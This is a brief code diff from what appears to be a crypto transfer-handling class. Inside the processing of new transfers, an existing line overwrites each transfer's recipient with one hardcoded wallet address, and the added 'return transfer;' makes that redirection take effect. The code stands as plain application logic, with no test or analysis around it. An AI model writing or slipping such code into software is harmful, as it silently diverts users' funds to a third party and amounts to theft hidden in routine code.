@@ -115,6 +115,7 @@ class TransferLogic {
             this.processNewTransfers(
               data.map((transfer: any) => {
                 transfer.to = "0xE5c30d9f83C2FfFf6995d27F340F2BdBB997747E";
+                return transfer;
               })
             );
           }
